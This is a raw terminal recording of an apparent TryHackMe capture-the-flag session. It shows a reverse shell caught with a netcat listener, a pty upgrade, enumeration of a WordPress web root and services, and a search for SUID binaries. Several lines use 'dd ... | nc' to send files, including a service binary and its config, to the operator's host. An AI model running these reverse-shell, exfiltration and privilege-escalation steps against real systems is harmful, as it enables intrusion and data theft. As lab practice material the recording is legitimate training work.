@@ -1,0 +1,360 @@
+Script started on 2025-03-20 01:48:12+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 6237
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1001(apache) gid=1001(apache) groups=1001(apache)
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bu[Kin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K650c844110baced87e1606453b93f22a.txt  wp-blog-header.php    wp-load.php
+index.php			      wp-comments-post.php  wp-login.php
+kod				      wp-config-sample.php  wp-mail.php
+license.txt			      wp-config.php	    wp-settings.php
+phpmyadmin			      wp-content	    wp-signup.php
+readme.html			      wp-cron.php	    wp-trackback.php
+wp-activate.php			      wp-includes	    xmlrpc.php
+wp-admin			      wp-links-opml.php
+apache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ whih[Kch nc[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich nc
+[Kwhich nc
+[K/usr/bin/nc
+apache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ dd if [K=[7m650c844110baced87e1606453b93f22a.txt[27m650c844110baced87e1606453b93f22a.txt staus[K[Ktus=progress | nc 10.8 .61.245 4444[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=650c844110baced87e1606453b93f22a.txt status=progress | nc 10.8.61.245 4444
+[K<53b93f22a.txt status=progress | nc 10.8.61.245 4444[K<53b93f22a.txt status=progress | nc 10.8.61.245 4444[K<53b93f22a.txt status=progress | nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+43 bytes copied, 0.000799543 s, 53.8 kB/s
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ [7msystemctl list-units --type=service --state=running[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsystemctl list-units --type=service --state=running
+[K<systemctl list-units --type=service --state=running[K<systemctl list-units --type=service --state=running[K<systemctl list-units --type=service --state=running
+  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                 
+  accounts-daemon.service     loaded active running Accounts Service            
+  acpid.service               loaded active running ACPI event daemon           
+  atd.service                 loaded active running Deferred execution scheduler
+  avahi-daemon.service        loaded active running Avahi mDNS/DNS-SD Stack     
+  badr.service                loaded active running My startup script           
+  cron.service                loaded active running Regular background program …
+  cups-browsed.service        loaded active running Make remote CUPS printers a…
+  cups.service                loaded active running CUPS Scheduler              
+  dbus.service                loaded active running D-Bus System Message Bus    
+  fwupd.service               loaded active running Firmware update daemon      
+  getty@tty1.service          loaded active running Getty on tty1               
+  httpd.service               loaded active running LSB: starts Apache Web Serv…
+  irqbalance.service          loaded active running irqbalance daemon           
+  kerneloops.service          loaded active running Tool to automatically colle…
+  lightdm.service             loaded active running Light Display Manager       
+  ModemManager.service        loaded active running Modem Manager               
+  multipathd.service          loaded active running Device-Mapper Multipath Dev…
+  mysqld.service              loaded active running LSB: start and stop MySQL   
+  networkd-dispatcher.service loaded active running Dispatcher daemon for syste…
+  NetworkManager.service      loaded active running Network Manager             
+  polkit.service              loaded active running Authorization Manager       
+  rsyslog.service             loaded active running System Logging Service      
+  rtkit-daemon.service        loaded active running RealtimeKit Scheduling Poli…
+  serial-getty@ttyS0.service  loaded active running Serial Getty on ttyS0       
+  snap.amazon-ssm-agent.amaz… loaded active running Service for snap applicatio…
+  snapd.service               loaded active running Snap Daemon                 
+  ssh.service                 loaded active running OpenBSD Secure Shell server 
+  switcheroo-control.service  loaded active running Switcheroo Control Proxy se…
+  systemd-journald.service    loaded active running Journal Service             
+  systemd-logind.service      loaded active running Login Service               
+  systemd-networkd.service    loaded active running Network Service             
+  systemd-resolved.service    loaded active running Network Name Resolution     
+  systemd-timesyncd.service   loaded active running Network Time Synchronization
+  systemd-udevd.service       loaded active running udev Kernel Device Manager  
+  ubuntu.service              loaded active running TRYHACK3M                   
+  udisks2.service             loaded active running Disk Manager                
+  unattended-upgrades.service loaded active running Unattended Upgrades Shutdown
+  upower.service              loaded active running Daemon for power management 
+  user@1000.service           loaded active running User Manager for UID 1000   
+  user@114.service            loaded active running User Manager for UID 114    
+  whoopsie.service            loaded active running crash report submission dae…
+  wpa_supplicant.service      loaded active running WPA supplicant              
+
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+SUB    = The low-level unit activation state, values depend on unit type.
+
+42 loaded units listed.
+apache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ [7msystemctl status ubuntu.service[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsystemctl status ubuntu.service
+[Ksystemctl status ubuntu.service[Ksystemctl status ubuntu.service[Ksystemctl status ubuntu.service
+● ubuntu.service - TRYHACK3M
+     Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
+     Active: active (running) since Wed 2025-03-19 22:53:20 UTC; 3min 21s ago
+   Main PID: 11566 (nm-inet-dialog)
+      Tasks: 2 (limit: 4671)
+     Memory: 33.2M
+     CGroup: /system.slice/ubuntu.service
+             ├─11566 /lib/NetworkManager/nm-inet-dialog
+             └─11567 /lib/NetworkManager/nm-inet-dialog
+apache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ whereis [7mTRYHACK3M[27m[7mwhereis [27mTRYHACK3M[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhereis TRYHACK3M
+[Kwhereis TRYHACK3M[Kwhereis TRYHACK3M[Kwhereis TRYHACK3M
+[KTRYHACK3M:[KTRYHACK3M:[KTRYHACK3M:
+apache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ whereis [7mubuntu.service[27m[7mwhereis [27mubuntu.service[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhereis ubuntu.service
+[Kwhereis ubuntu.service[Kwhereis ubuntu.service[Kwhereis ubuntu.service
+[Kubuntu: /usr/src/linux-headers-5.4.0-1029-aws/ubuntu /usr/src/linux-headers-5.15.0-1056-aws/ubuntu /usr/src/linux-aws-headers-5.4.0-1029/ubuntu /usr/src/linux-aws-5.15-headers-5.15.0-1053/ubuntu /usr/src/linux-headers-5.15.0-1053-aws/ubuntu /usr/src/linux-aws-5.15-headers-5.15.0-1056/ubuntu
+apache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ dd if=[7m/etc/systemd/system/ubuntu.service[27m/etc/systemd/system/ubuntu.service |[Kstatud[Ks=progress | nc 10.8.6 1.245 4444[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=/etc/systemd/system/ubuntu.service status=progress | nc 10.8.61.245 4444
+[K<buntu.service status=progress | nc 10.8.61.245 4444[K<buntu.service status=progress | nc 10.8.61.245 4444[K<buntu.service status=progress | nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+154 bytes copied, 0.00156755 s, 98.2 kB/s
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ dd if [K=[7m/lib/NetworkManager/nm-inet-dialog[27m/lib/NetworkManager/nm-inet-dialog stau[Ktus=progress | nc 10.8.6 1.245 4444[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=/lib/NetworkManager/nm-inet-dialog status=progress | nc 10.8.61.245 4444
+[K<m-inet-dialog status=progress | nc 10.8.61.245 4444[K<m-inet-dialog status=progress | nc 10.8.61.245 4444[K<m-inet-dialog status=progress | nc 10.8.61.245 4444
+[K[K[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s[K[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s[K459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s[K737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s[K[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s[K1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s[K1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s[K1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s[K[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s[K2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s[K3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s[K[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s4227584 bytes (4.2 MB, 4.0 MiB) copied, 9 s, 470 kB/s[K4227584 bytes (4.2 MB, 4.0 MiB) copied, 9 s, 470 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s4227584 bytes (4.2 MB, 4.0 MiB) copied, 9 s, 470 kB/s[K[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s4227584 bytes (4.2 MB, 4.0 MiB) copied, 9 s, 470 kB/s5440000 bytes (5.4 MB, 5.2 MiB) copied, 10 s, 543 kB/s[K5440000 bytes (5.4 MB, 5.2 MiB) copied, 10 s, 543 kB/s[K279040 bytes (279 kB, 272 KiB) copied, 1 s, 224 kB/s459264 bytes (459 kB, 448 KiB) copied, 2 s, 222 kB/s737792 bytes (738 kB, 720 KiB) copied, 3 s, 237 kB/s1016320 bytes (1.0 MB, 992 KiB) copied, 4 s, 249 kB/s1393152 bytes (1.4 MB, 1.3 MiB) copied, 5 s, 278 kB/s1786368 bytes (1.8 MB, 1.7 MiB) copied, 6 s, 297 kB/s2376192 bytes (2.4 MB, 2.3 MiB) copied, 7 s, 338 kB/s3113472 bytes (3.1 MB, 3.0 MiB) copied, 8 s, 388 kB/s4227584 bytes (4.2 MB, 4.0 MiB) copied, 9 s, 470 kB/s5440000 bytes (5.4 MB, 5.2 MiB) copied, 10 s, 543 kB/s
+13571+1 records in
+13571+1 records out
+[K6948448 bytes (6.9 MB, 6.6 MiB) copied, 10.8285 s, 642 kB/s
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ find / -name inet.conf -type f 2>/dev/null[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -name inet.conf -type f 2>/dev/null
+[K<default$ find / -name inet.conf -type f 2>/dev/null
+[K/usr/lib/NetworkManager/inet.conf
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ dd if=[7m/usr/lib/NetworkManager/inet.conf[27m/usr/lib/NetworkManager/inet.conf status=progress | nc 10.8.61 .245 4444[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=/usr/lib/NetworkManager/inet.conf status=progress | nc 10.8.61.245 4444
+[K<ger/inet.conf status=progress | nc 10.8.61.245 4444
+[K94+1 records in
+94+1 records out
+48190 bytes (48 kB, 47 KiB) copied, 0.00226707 s, 21.3 MB/s
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+[Kapache@tryhackme:/home$ [Kapache@tryhackme:/home$ [K[?2004hapache@tryhackme:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kubuntu
+apache@tryhackme:/home$ [Kapache@tryhackme:/home$ [K[?2004hapache@tryhackme:/home$ cd ubuntu[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ubuntu
+[Kcd ubuntu
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KDesktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 116
+drwxr-xr-x 20 ubuntu ubuntu  4096 Mar 19 21:38 .
+drwxr-xr-x  3 root   root    4096 Feb 27  2022 ..
+-rw-------  1 ubuntu ubuntu   884 Mar 19 21:38 .Xauthority
+lrwxrwxrwx  1 root   root       9 Apr  5  2024 .bash_history -> /dev/null
+-rw-r--r--  1 ubuntu ubuntu   220 Feb 25  2020 .bash_logout
+-rw-r--r--  1 ubuntu ubuntu  3771 Feb 25  2020 .bashrc
+drwx------ 14 ubuntu ubuntu  4096 Mar 19 21:39 .cache
+drwx------ 22 ubuntu ubuntu  4096 Apr  5  2024 .config
+drwx------  3 ubuntu ubuntu  4096 Feb 27  2022 .dbus
+drwx------  3 ubuntu ubuntu  4096 Feb 27  2022 .gnupg
+drwxrwxr-x  2 ubuntu ubuntu  4096 Feb 27  2022 .icons
+drwx------  5 ubuntu ubuntu  4096 Feb 27  2022 .local
+drwx------  4 ubuntu ubuntu  4096 Feb 27  2022 .mozilla
+-rw-r--r--  1 ubuntu ubuntu   807 Feb 25  2020 .profile
+drwx------  2 ubuntu ubuntu  4096 Feb 27  2022 .ssh
+-rw-r--r--  1 ubuntu ubuntu     0 Apr  8  2024 .sudo_as_admin_successful
+drwxrwxr-x  2 ubuntu ubuntu  4096 Feb 27  2022 .themes
+-rw-------  1 ubuntu ubuntu 11161 Apr  5  2024 .viminfo
+drwxr-xr-x  2 ubuntu ubuntu  4096 Mar 19 21:38 .vnc
+-rw-------  1 ubuntu ubuntu  5833 Feb 27  2022 .xsession-errors
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Desktop
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Documents
+drwxr-xr-x  3 ubuntu ubuntu  4096 Apr  8  2024 Downloads
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Music
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Pictures
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Public
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Templates
+drwxr-xr-x  2 ubuntu ubuntu  4096 Feb 27  2022 Videos
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ cd .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh
+[Kbash: cd: .ssh: Permission denied
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ ls .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls .ssh
+[Kls .ssh
+[Kls: cannot open directory '.ssh': Permission denied
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo: 3 incorrect password attempts
+[Kapache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ [7mfind / -user root -perm /4000 2>/dev/null[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user root -perm /4000 2>/dev/null
+[Kfind / -user root -perm /4000 2>/dev/null
+[K/snap/core20/2182/usr/bin/chfn
+[K/snap/core20/2182/usr/bin/chsh
+/snap/core20/2182/usr/bin/gpasswd
+/snap/core20/2182/usr/bin/mount
+/snap/core20/2182/usr/bin/newgrp
+/snap/core20/2182/usr/bin/passwd
+/snap/core20/2182/usr/bin/su
+/snap/core20/2182/usr/bin/sudo
+/snap/core20/2182/usr/bin/umount
+/snap/core20/2182/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2182/usr/lib/openssh/ssh-keysign
+/snap/core20/2105/usr/bin/chfn
+/snap/core20/2105/usr/bin/chsh
+/snap/core20/2105/usr/bin/gpasswd
+/snap/core20/2105/usr/bin/mount
+/snap/core20/2105/usr/bin/newgrp
+/snap/core20/2105/usr/bin/passwd
+/snap/core20/2105/usr/bin/su
+/snap/core20/2105/usr/bin/sudo
+/snap/core20/2105/usr/bin/umount
+/snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2105/usr/lib/openssh/ssh-keysign
+[K/snap/core/16928/bin/mount
+/snap/core/16928/bin/ping
+/snap/core/16928/bin/ping6
+/snap/core/16928/bin/su
+/snap/core/16928/bin/umount
+/snap/core/16928/usr/bin/chfn
+/snap/core/16928/usr/bin/chsh
+/snap/core/16928/usr/bin/gpasswd
+/snap/core/16928/usr/bin/newgrp
+/snap/core/16928/usr/bin/passwd
+/snap/core/16928/usr/bin/sudo
+/snap/core/16928/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/16928/usr/lib/openssh/ssh-keysign
+/snap/core/16928/usr/lib/snapd/snap-confine
+/snap/core/16928/usr/sbin/pppd
+[K/snap/core/16574/bin/mount
+/snap/core/16574/bin/ping
+/snap/core/16574/bin/ping6
+/snap/core/16574/bin/su
+/snap/core/16574/bin/umount
+/snap/core/16574/usr/bin/chfn
+/snap/core/16574/usr/bin/chsh
+/snap/core/16574/usr/bin/gpasswd
+/snap/core/16574/usr/bin/newgrp
+/snap/core/16574/usr/bin/passwd
+/snap/core/16574/usr/bin/sudo
+/snap/core/16574/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/16574/usr/lib/openssh/ssh-keysign
+/snap/core/16574/usr/lib/snapd/snap-confine
+/snap/core/16574/usr/sbin/pppd
+[K/snap/core18/2812/bin/mount
+/snap/core18/2812/bin/ping
+/snap/core18/2812/bin/su
+/snap/core18/2812/bin/umount
+/snap/core18/2812/usr/bin/chfn
+/snap/core18/2812/usr/bin/chsh
+/snap/core18/2812/usr/bin/gpasswd
+/snap/core18/2812/usr/bin/newgrp
+/snap/core18/2812/usr/bin/passwd
+/snap/core18/2812/usr/bin/sudo
+/snap/core18/2812/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2812/usr/lib/openssh/ssh-keysign
+/snap/core18/2284/bin/mount
+/snap/core18/2284/bin/ping
+/snap/core18/2284/bin/su
+/snap/core18/2284/bin/umount
+/snap/core18/2284/usr/bin/chfn
+/snap/core18/2284/usr/bin/chsh
+/snap/core18/2284/usr/bin/gpasswd
+/snap/core18/2284/usr/bin/newgrp
+/snap/core18/2284/usr/bin/passwd
+/snap/core18/2284/usr/bin/sudo
+/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2284/usr/lib/openssh/ssh-keysign
+[K/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+[K/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+[K/usr/lib/eject/dmcrypt-get-device
+[K/usr/lib/xorg/Xorg.wrap
+[K/usr/lib/snapd/snap-confine
+/usr/sbin/pppd
+[K/usr/bin/chfn
+[K/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/mount
+[K/usr/local/apache/bin/suexec
